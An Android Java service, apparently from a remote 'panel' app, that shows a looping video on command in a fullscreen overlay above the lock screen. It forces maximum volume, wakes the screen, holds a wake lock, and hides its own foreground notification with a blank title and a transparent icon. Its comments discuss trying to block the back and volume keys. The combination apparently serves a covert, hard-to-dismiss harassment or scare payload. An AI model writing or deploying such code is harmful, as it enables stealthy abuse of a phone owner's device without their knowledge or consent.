package com.nex.panel;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.res.AssetFileDescriptor;
import android.graphics.Color;
import android.graphics.PixelFormat;
import android.media.AudioAttributes;
import android.media.AudioFocusRequest;
import android.media.AudioManager;
import android.media.MediaPlayer;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.util.Log;
import android.view.Gravity;
import android.view.SurfaceHolder;
import android.view.SurfaceView;
import android.view.WindowManager;
import android.widget.FrameLayout;

import androidx.core.app.NotificationCompat;

public class VideoOverlayService extends Service implements SurfaceHolder.Callback {

    private static final String TAG      = "VideoOverlayService";
    private static final String CHANNEL  = "nex_video_overlay";
    private static final int    NOTIF_ID = 9991;

    public static final String ACTION_SHOW_VIDEO = "com.nex.panel.ACTION_SHOW_VIDEO";
    public static final String ACTION_STOP_VIDEO = "com.nex.panel.ACTION_STOP_VIDEO";

    private WindowManager          wm;
    private FrameLayout            overlayRoot;
    private SurfaceView            surfaceView;
    private MediaPlayer            mediaPlayer;
    private PowerManager.WakeLock  wakeLock;
    private AudioFocusRequest      audioFocusReq; // API 26+

    // FIX BUG 7: flag untuk cegah release saat masih preparing
    private volatile boolean       isPreparing = false;
    // FIX: flag untuk cegah race condition antara show dan stop
    private volatile boolean       isOverlayVisible = false;

    private final Handler uiHandler = new Handler(Looper.getMainLooper());

    // ── onCreate ─────────────────────────────────────────────────────────
    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        startForeground(NOTIF_ID, buildNotification());
        wm = (WindowManager) getSystemService(WINDOW_SERVICE);
    }

    // ── onStartCommand ────────────────────────────────────────────────────
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent == null) return START_STICKY;
        String action = intent.getAction();
        if (ACTION_SHOW_VIDEO.equals(action)) {
            // FIX: post ke uiHandler untuk thread safety
            uiHandler.post(this::showVideoOverlay);
        } else if (ACTION_STOP_VIDEO.equals(action)) {
            uiHandler.post(this::stopVideoOverlay);
        }
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    // ── Tampilkan overlay video fullscreen ───────────────────────────────
    private void showVideoOverlay() {
        try {
            // FIX: Jika sudah ada overlay, stop dulu dengan benar sebelum buat baru
            if (isOverlayVisible) {
                stopVideoOverlayInternal();
                // Tunggu sebentar agar surface benar-benar destroyed
                uiHandler.postDelayed(this::doShowVideoOverlay, 200);
            } else {
                doShowVideoOverlay();
            }
        } catch (Exception e) {
            Log.e(TAG, "showVideoOverlay error: " + e.getMessage());
        }
    }

    private void doShowVideoOverlay() {
        try {
            // Root FrameLayout hitam fullscreen
            FrameLayout root = new FrameLayout(this);
            root.setBackgroundColor(Color.BLACK);

            // FIX BUG 1: FLAG_NOT_FOCUSABLE wajib untuk TYPE_APPLICATION_OVERLAY
            // OnKeyListener tidak bekerja di overlay karena sistem tidak routing key events ke overlay
            // → Hapus OnKeyListener yang tidak efektif
            // Volume dan back button tidak bisa diblok dari overlay service (hanya dari Activity)
            // Yang bisa dilakukan: pakai FLAG_NOT_TOUCH_MODAL untuk tetap intercept touch

            // SurfaceView untuk video
            SurfaceView sv = new SurfaceView(this);
            sv.setLayoutParams(new FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.MATCH_PARENT,
                FrameLayout.LayoutParams.MATCH_PARENT,
                Gravity.CENTER
            ));
            root.addView(sv);

            overlayRoot  = root;
            surfaceView  = sv;
            isOverlayVisible = false; // akan true setelah addView berhasil

            // FIX BUG 3 & 4: Daftarkan callback SETELAH assign ke field
            // sehingga surfaceDestroyed selalu bisa akses field yang valid
            sv.getHolder().addCallback(this);

            // WindowManager params
            // FIX BUG 1: Hapus FLAG_NOT_FOCUSABLE agar touch events berfungsi normal
            // FIX BUG 8: FLAG_SHOW_WHEN_LOCKED & FLAG_DISMISS_KEYGUARD masih valid untuk service overlay
            int type = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
                ? WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                : WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY;

            int flags = WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
                | WindowManager.LayoutParams.FLAG_FULLSCREEN
                | WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED
                | WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON
                | WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON;

            // FIX BUG 8: FLAG_DISMISS_KEYGUARD deprecated API 26+ tapi tetap bekerja,
            // tidak ada pengganti di Service (hanya Activity.setShowWhenLocked)
            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) {
                flags |= WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD;
            }

            WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                type,
                flags,
                PixelFormat.OPAQUE
            );
            params.gravity = Gravity.TOP | Gravity.START;

            wm.addView(overlayRoot, params);
            isOverlayVisible = true;

            // Paksa layar tetap ON via WakeLock
            acquireWakeLock();

            Log.d(TAG, "Video overlay added to WindowManager");

        } catch (Exception e) {
            Log.e(TAG, "doShowVideoOverlay error: " + e.getMessage());
            // Cleanup jika addView gagal
            overlayRoot = null;
            surfaceView = null;
            isOverlayVisible = false;
        }
    }

    // ── SurfaceHolder.Callback ─────────────────────────────────────────────
    @Override
    public void surfaceCreated(SurfaceHolder holder) {
        // FIX BUG 7: Reset isPreparing dan release player lama dengan aman
        initMediaPlayer(holder);
    }

    private void initMediaPlayer(SurfaceHolder holder) {
        try {
            // Release player lama dengan aman
            safeReleaseMediaPlayer();

            mediaPlayer = new MediaPlayer();
            isPreparing = true;

            // Set audio stream
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                AudioAttributes aa = new AudioAttributes.Builder()
                    .setUsage(AudioAttributes.USAGE_MEDIA)
                    .setContentType(AudioAttributes.CONTENT_TYPE_MOVIE)
                    .build();
                mediaPlayer.setAudioAttributes(aa);
            } else {
                //noinspection deprecation
                mediaPlayer.setAudioStreamType(AudioManager.STREAM_MUSIC);
            }

            // FIX: Request audio focus agar audio tidak tumpang tindih
            requestAudioFocus();

            // Paksa volume speaker ke max
            AudioManager am = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
            if (am != null) {
                am.setStreamVolume(
                    AudioManager.STREAM_MUSIC,
                    am.getStreamMaxVolume(AudioManager.STREAM_MUSIC),
                    0
                );
                // FIX: setSpeakerphoneOn hanya untuk audio call stream, tidak untuk MUSIC
                // Untuk MUSIC stream, speaker sudah default — tidak perlu setSpeakerphoneOn
            }

            // Load video dari assets
            AssetFileDescriptor afd = getAssets().openFd("overlay_video.mp4");
            mediaPlayer.setDataSource(
                afd.getFileDescriptor(),
                afd.getStartOffset(),
                afd.getLength()
            );
            afd.close();

            // Pasang surface dan setting video
            mediaPlayer.setDisplay(holder);
            mediaPlayer.setLooping(true);
            mediaPlayer.setVideoScalingMode(MediaPlayer.VIDEO_SCALING_MODE_SCALE_TO_FIT_WITH_CROPPING);
            mediaPlayer.setScreenOnWhilePlaying(true);

            // FIX: Error listener dengan auto-retry sekali
            final int[] errorCount = {0};
            mediaPlayer.setOnErrorListener((mp, what, extra) -> {
                Log.e(TAG, "MediaPlayer error: what=" + what + " extra=" + extra);
                isPreparing = false;
                errorCount[0]++;
                if (errorCount[0] == 1) {
                    // Retry sekali setelah error
                    uiHandler.postDelayed(() -> {
                        if (isOverlayVisible && surfaceView != null) {
                            initMediaPlayer(surfaceView.getHolder());
                        }
                    }, 1000);
                }
                return true;
            });

            // FIX: Completion listener (tidak akan trigger karena looping=true,
            // tapi jaga-jaga jika looping gagal)
            mediaPlayer.setOnCompletionListener(mp -> {
                if (isOverlayVisible) {
                    try { mp.start(); } catch (Exception ignored) {}
                }
            });

            mediaPlayer.setOnPreparedListener(mp -> {
                isPreparing = false;
                // FIX: Cek apakah overlay masih aktif sebelum start
                if (isOverlayVisible && mp == mediaPlayer) {
                    try {
                        mp.start();
                        Log.d(TAG, "Video started playing");
                    } catch (Exception e) {
                        Log.e(TAG, "mp.start() error: " + e.getMessage());
                    }
                } else {
                    // Overlay sudah di-stop sebelum prepared selesai → release
                    safeReleaseMediaPlayer();
                }
            });

            mediaPlayer.prepareAsync();

        } catch (Exception e) {
            isPreparing = false;
            Log.e(TAG, "initMediaPlayer error: " + e.getMessage());
            safeReleaseMediaPlayer();
        }
    }

    @Override
    public void surfaceChanged(SurfaceHolder holder, int format, int width, int height) {
        // FIX: Jika player sudah ada dan playing, update display
        if (mediaPlayer != null && !isPreparing) {
            try {
                mediaPlayer.setDisplay(holder);
            } catch (Exception ignored) {}
        }
    }

    @Override
    public void surfaceDestroyed(SurfaceHolder holder) {
        // FIX BUG 3: surfaceDestroyed dipanggil saat wm.removeView()
        // Hanya release jika mediaPlayer masih ada (null-safe)
        // Set display ke null dulu agar tidak crash
        try {
            if (mediaPlayer != null && !isPreparing) {
                mediaPlayer.setDisplay(null);
            }
        } catch (Exception ignored) {}
        safeReleaseMediaPlayer();
    }

    // ── Hentikan dan hapus overlay video ─────────────────────────────────
    private void stopVideoOverlay() {
        stopVideoOverlayInternal();
    }

    private void stopVideoOverlayInternal() {
        try {
            // FIX BUG 3 & 4: Simpan ref lokal dulu
            SurfaceView  svLocal   = surfaceView;
            FrameLayout  rootLocal = overlayRoot;

            // Set flag DULU agar surfaceDestroyed tahu overlay sudah stop
            isOverlayVisible = false;
            overlayRoot  = null;
            surfaceView  = null;

            // FIX BUG 7: Release mediaPlayer dengan aman (handle isPreparing)
            safeReleaseMediaPlayer();

            // FIX BUG 3 & 4: Remove SurfaceHolder callback SEBELUM removeView
            // Ini mencegah surfaceDestroyed memanggil releaseMediaPlayer lagi
            if (svLocal != null) {
                try { svLocal.getHolder().removeCallback(this); } catch (Exception ignored) {}
            }

            // Sekarang aman untuk removeView
            if (rootLocal != null && wm != null) {
                try {
                    wm.removeView(rootLocal);
                } catch (Exception e) {
                    Log.w(TAG, "removeView warning: " + e.getMessage());
                }
            }

            releaseAudioFocus();
            releaseWakeLock();
            Log.d(TAG, "Video overlay stopped");

        } catch (Exception e) {
            Log.e(TAG, "stopVideoOverlay error: " + e.getMessage());
        }
    }

    // FIX BUG 7: safeReleaseMediaPlayer — aman saat isPreparing
    private void safeReleaseMediaPlayer() {
        MediaPlayer mp = mediaPlayer;
        mediaPlayer = null;
        isPreparing = false;
        if (mp != null) {
            try {
                // Reset semua listener dulu agar tidak ada callback setelah release
                mp.setOnPreparedListener(null);
                mp.setOnErrorListener(null);
                mp.setOnCompletionListener(null);
                if (mp.isPlaying()) mp.stop();
                mp.reset();
                mp.release();
            } catch (Exception ignored) {}
        }
    }

    // ── Audio Focus ────────────────────────────────────────────────────────
    private void requestAudioFocus() {
        AudioManager am = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
        if (am == null) return;
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                AudioAttributes aa = new AudioAttributes.Builder()
                    .setUsage(AudioAttributes.USAGE_MEDIA)
                    .setContentType(AudioAttributes.CONTENT_TYPE_MOVIE)
                    .build();
                audioFocusReq = new AudioFocusRequest.Builder(AudioManager.AUDIOFOCUS_GAIN)
                    .setAudioAttributes(aa)
                    .setAcceptsDelayedFocusGain(false)
                    .setWillPauseWhenDucked(false)
                    .build();
                am.requestAudioFocus(audioFocusReq);
            } else {
                //noinspection deprecation
                am.requestAudioFocus(null, AudioManager.STREAM_MUSIC, AudioManager.AUDIOFOCUS_GAIN);
            }
        } catch (Exception e) {
            Log.w(TAG, "requestAudioFocus error: " + e.getMessage());
        }
    }

    private void releaseAudioFocus() {
        AudioManager am = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
        if (am == null) return;
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O && audioFocusReq != null) {
                am.abandonAudioFocusRequest(audioFocusReq);
                audioFocusReq = null;
            } else {
                //noinspection deprecation
                am.abandonAudioFocus(null);
            }
        } catch (Exception ignored) {}
    }

    // ── WakeLock ──────────────────────────────────────────────────────────
    private void acquireWakeLock() {
        try {
            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
            if (pm != null && (wakeLock == null || !wakeLock.isHeld())) {
                wakeLock = pm.newWakeLock(
                    PowerManager.SCREEN_BRIGHT_WAKE_LOCK |
                    PowerManager.ACQUIRE_CAUSES_WAKEUP,
                    "NexPanel:VideoOverlay"
                );
                wakeLock.acquire(60 * 60 * 1000L); // FIX: 60 menit (was 30)
            }
        } catch (Exception e) {
            Log.e(TAG, "acquireWakeLock error: " + e.getMessage());
        }
    }

    private void releaseWakeLock() {
        try {
            if (wakeLock != null && wakeLock.isHeld()) {
                wakeLock.release();
                wakeLock = null;
            }
        } catch (Exception ignored) {}
    }

    // FIX BUG 6: onDestroy harus stopVideoOverlay SYNC bukan async
    @Override
    public void onDestroy() {
        // FIX: Panggil langsung (bukan post) agar selesai sebelum super.onDestroy()
        stopVideoOverlayInternal();
        // Hapus semua pending posts agar tidak ada callback setelah destroy
        uiHandler.removeCallbacksAndMessages(null);
        super.onDestroy();
    }

    // ── Notification ─────────────────────────────────────────────────────
    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            try {
                NotificationChannel ch = new NotificationChannel(
                    CHANNEL, "Video Overlay", NotificationManager.IMPORTANCE_NONE);
                ch.setSound(null, null);
                ch.setShowBadge(false);
                ch.setLockscreenVisibility(Notification.VISIBILITY_SECRET);
                NotificationManager nm = getSystemService(NotificationManager.class);
                if (nm != null) nm.createNotificationChannel(ch);
            } catch (Exception e) {
                Log.e(TAG, "Create channel error: " + e.getMessage());
            }
        }
    }

    private Notification buildNotification() {
        return new NotificationCompat.Builder(this, CHANNEL)
            .setContentTitle("")
            .setContentText("")
            .setSmallIcon(R.drawable.ic_transparent)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setSilent(true)
            .setOngoing(true)   // FIX BUG 5: ongoing=true agar service tidak di-kill sistem
            .build();
    }
}
